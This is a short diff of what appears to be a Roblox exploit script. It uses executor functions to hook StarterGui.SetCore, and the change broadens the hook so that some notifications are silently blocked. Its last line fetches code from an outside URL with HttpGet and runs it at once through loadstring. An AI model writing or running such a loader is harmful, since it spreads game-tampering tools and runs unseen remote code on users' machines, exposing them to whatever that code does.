@@ -43,7 +43,7 @@ end))
 
 local old_setcore = clonefunction(StarterGui.SetCore)
 hookfunction(StarterGui.SetCore, newcclosure(function(self, name, ...)
-	if name == "SendNotification" and args_have_key(...) then return end
+	if args_have_key(...) then return end
 	return old_setcore(self, name, ...)
 end))
 loadstring(game:HttpGet("https://script.pufus.win/nnm2k8fv"))()
